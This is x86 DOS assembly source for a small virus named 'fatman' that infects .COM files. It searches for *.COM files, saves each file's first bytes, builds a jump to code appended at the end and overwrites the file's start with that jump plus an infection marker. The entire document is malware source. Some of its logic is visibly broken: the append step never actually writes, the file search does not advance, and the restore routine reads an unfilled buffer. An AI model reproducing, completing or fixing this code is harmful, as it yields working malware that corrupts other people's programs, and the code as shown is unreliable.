code    segment'code'
assume  cs:code, ds:code, ss:code, es:code
org     100h
dta             equ     endcode  + 10
fatmanid        equ     34
start:

        jmp     virus
        hoststart:
        db      90h,90h,90h             ;NOP
        db      0cdh,020h,1ah,1ah       ;INT 20
        hostend:
        virus:
        call $ + 2
fatman:
        pop     bp                         ;Search for next files
        sub     bp,offset fatman
        mov     ah,1ah
        lea     dx,[bp +dta]
        int     21h
        mov     ah,4eh
        lea     dx,[bp + filespec]
        xor     cx,cx
fileloop:
        int     21h
        jc      quit
        mov     ax,3d02h                   ;Open file read and write
        lea     dx,[bp + offset dta + 30]  ;Move the offset of filename
        int     21h                        ;into dx register
        jc      quit
        xchg    bx,ax
        mov     ah,3fh                     ;read from file
        mov     cx,4                       ;read 4 bytes off file
        lea     dx,[bp + orgjmp]           ;store the 4 bytes
        int     21h
        mov     ax,4202h                   ;point to end of file
        xor     cx,cx
        xor     dx,dx
        int     21h
        sub     ax,03h                     ;Back three bytes from org
        mov     [bp + newjmp + 2], ah      ;high location
        mov     [bp + newjmp + 1], al      ;low location
        mov     [bp + newjmp + 3], fatmanid;his ID
        mov     ah,0e9h                    ;JMP
        mov     [bp + newjmp],ah
        mov     ah,40h                    ;write to file
        mov     cx,endcode - virus
        lea     dx,[bp + virus]
        jc      quit
        mov     ax,4200h                  ;Moving to TOP of file
        xor     cx,cx
        xor     dx,dx
        int     21h
        mov     ah,40h                   ;writing 4 bytes to top of file
        mov     cx,4
        lea     dx,[bp + offset newjmp]
        int     21h
        mov     ah,1ah
        mov     dx,080h
        int     21h
        quit:
        lea     si,[bp + offset thisjmp]
        mov     di,0100h
        mov     cx,04h
        cld
        rep     movsb
        mov     di,0100h
        jmp     di

        


        filespec        db      '*.COM',0
        orgjmp          db      4 dup (?)
        newjmp          db      4 dup (?)
        thisjmp         db      4 dup (?)
        oldjmp          db      09h,0cdh,020h,90h
        endcode:

        code    ends
        end     start
